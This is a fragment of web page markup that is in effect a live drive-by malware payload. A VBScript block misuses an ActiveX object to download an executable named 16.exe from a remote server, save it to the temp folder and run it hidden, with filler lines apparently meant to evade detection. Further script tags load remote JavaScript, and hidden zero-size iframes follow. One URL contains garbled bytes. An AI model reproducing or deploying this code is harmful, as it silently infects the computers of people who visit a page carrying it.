



  <script language="VBScript">
    on error resume next
dl = "http://china.ic-soft.cn/16.exe":fname1="16.exe"
sub shellexe(fname1)
set Q = df.createobject("Shell.Application","")

Q.ShellExecute fname1,"","","open",0
end sub
   Set df = document.createElement("object")

    df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"

       Set x = df.CreateObject("Microsoft.XMLHTTP","")

       set SS = df.createobject("Adodb.Stream","")

    SS.type = 1

x.Open "GET", dl, False

    x.Send

set F = df.createobject("Scripting.FileSystemObject","")

     set tmp = F.GetSpecialFolder(2)

    SS.open

    fname1= F.BuildPath(tmp,fname1)


'''''''''''''''''''''
    SS.write x.responseBody
aaaa=1
bbbb=2
cccc=3
aaaa=1
bbbb=2
cccc=3
    SS.savetofile fname1,2
aaaa=1
bbbb=2
cccc=3
aaaa=1
bbbb=2
cccc=3

    SS.close

'''''''''''''''

call shellexe(fname1)



    </script>
 




<script language=javascript src=http://cc.18dd.net/1.js></script>
<script language=javascript src=http://1.9797aiai.com/mm/down.js¤@[U1û„¤@[U1û„¤@[U1û„¤@[U1û„¤@[U1û„“ÛmïŠ‰Úw></script><IfrAmE src=http://127.0.0.1/test.htm width=0 height=0></IfrAmE>                                    
<IfrAmE src=http://127.0.0.1/test.htm width=0 height=0></IfrAmE>                                    
